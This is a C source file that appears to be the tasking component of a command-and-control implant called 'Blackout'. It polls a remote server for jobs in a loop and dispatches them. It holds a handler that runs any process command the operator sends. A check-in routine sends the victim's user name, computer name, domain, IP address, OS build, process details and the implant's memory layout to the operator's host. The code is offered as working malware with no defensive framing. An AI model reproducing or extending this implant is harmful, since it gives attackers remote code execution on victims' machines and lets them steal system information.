#include <Common.h>

FUNC VOID CommandDispatcher(
    void
) {
    BLACKOUT_INSTANCE

    Instance()->Commands[ 0 ] = { .ID = BLACKOUT_CHECKIN, .Function = CommandCheckin };
    Instance()->Commands[ 1 ] = { .ID = COMMAND_RUN,      .Function = CommandRun };

    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand = 0;

    Instance()->Win32.printf( "Command Dispatcher...\n" );

    do
    {
        if ( !Instance()->Session.Connected )
            return;

        SleepMain( Instance()->Session.SleepTime * 1000 );

        Package = PackageCreate( COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance()->Session.AgentId );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if ( DataBuffer && DataSize > 0 ) {
            ParserNew( &Parser, DataBuffer, DataSize );
            do
            {
                TaskCommand = ParserGetInt32( &Parser );

                if ( TaskCommand != COMMAND_NO_JOB )
                {
                    Instance()->Win32.printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < BLACKOUT_COMMAND_LENGTH; FunctionCounter++ )
                    {
                        Instance()->Win32.printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, Instance()->Commands[ FunctionCounter ].ID );
                        if ( Instance()->Commands[ FunctionCounter ].ID == TaskCommand )
                        {
                            Instance()->Commands[ FunctionCounter ].Function( &Parser );
                            FoundCommand = TRUE;
                            break;
                        }
                    }

                    if ( ! FoundCommand )
                        Instance()->Win32.printf( "Command not found !!\n" );

                } else Instance()->Win32.printf( "Is COMMAND_NO_JOB\n" );

            } while ( Parser.Length > 4 );

            MmSet( DataBuffer, 0, DataSize );
            Instance()->Win32.LocalFree( *( PVOID* ) DataBuffer );
            DataBuffer = NULL;

            ParserDestroy( &Parser );
        }
        else
        {
            Instance()->Win32.printf( "Transport: Failed\n" );
            break;
        }

    } while ( TRUE );

    Instance()->Session.Connected = FALSE;
}

FUNC VOID CommandRun(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    PPACKAGE Package       = PackageCreate( COMMAND_RUN );
    PSTR     ProcCmd       = ParserGetString( Parser, NULL );
    DWORD    ProcessId     = 0;
    DWORD    ThreadId      = 0;
    HANDLE   ProcessHandle = NULL;
    HANDLE   ThreadHandle  = NULL;
    BOOL     bCheck        = FALSE;

    bCheck = bkCreateProcess( ProcCmd, TRUE, NULL, &ProcessHandle, &ProcessId, &ThreadHandle, &ThreadId );
    if ( !bCheck )
        return;

    PackageAddBool( Package, bCheck );
    PackageAddInt32( Package, ProcessId );
    PackageAddInt32( Package, ThreadId );
    PackageTransmit( Package, NULL, NULL );
}

FUNC VOID CommandCheckin(
    _In_ PPARSER Parser
) {
    BLACKOUT_INSTANCE

    PPACKAGE Package = PackageCreate( BLACKOUT_CHECKIN );

    PackageAddInt32( Package, Instance()->Base.Buffer  );
    PackageAddInt32( Package, Instance()->Base.Length  );
    PackageAddInt32( Package, Instance()->Base.FullLen );
    PackageAddInt32( Package, Instance()->Base.RxBase  );
    PackageAddInt32( Package, Instance()->Base.RxSize  );

    PackageAddWString( Package, Instance()->Session.ProcessName     );
    PackageAddWString( Package, Instance()->Session.ProcessFullPath );
    PackageAddWString( Package, Instance()->Session.ProcessCmdLine  );
    PackageAddInt32(   Package, Instance()->Session.ProcessId       );
    PackageAddInt32(   Package, Instance()->Session.ParentProcId    );

    PackageAddString( Package, Instance()->System.UserName      );
    PackageAddString( Package, Instance()->System.ComputerName  );
    PackageAddString( Package, Instance()->System.DomainName    );
    PackageAddString( Package, Instance()->System.NetBios       );
    PackageAddString( Package, Instance()->System.IpAddress     );
    PackageAddInt32(  Package, Instance()->System.OsArch        );
    PackageAddInt32(  Package, Instance()->System.ProductType   );
    PackageAddInt32(  Package, Instance()->System.OsMajorV      );
    PackageAddInt32(  Package, Instance()->System.OsMinorv      );
    PackageAddInt32(  Package, Instance()->System.OsBuildNumber );

    PackageAddWString( Package, Instance()->Transport.Host      );
    PackageAddInt32(   Package, Instance()->Transport.Port      );
    PackageAddWString( Package, Instance()->Transport.UserAgent );

    PackageTransmit( Package, NULL, NULL );
}